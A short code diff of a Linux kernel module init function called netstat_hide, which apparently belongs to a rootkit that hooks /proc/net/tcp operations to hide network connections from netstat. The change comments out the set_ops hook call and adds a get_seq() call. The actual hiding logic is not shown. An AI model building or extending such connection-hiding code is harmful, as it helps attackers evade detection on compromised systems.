@@ -2,8 +2,9 @@
 static int __init netstat_hide(void)
 {
     int ret;
-    ret = set_ops("/proc/net/tcp");
-    printk(KERN_ALERT "set ops done, ret equals to : %d", ret);
+    get_seq();
+    //ret = set_ops("/proc/net/tcp");
+    //printk(KERN_ALERT "set ops done, ret equals to : %d", ret);
 
     return 0;
 }
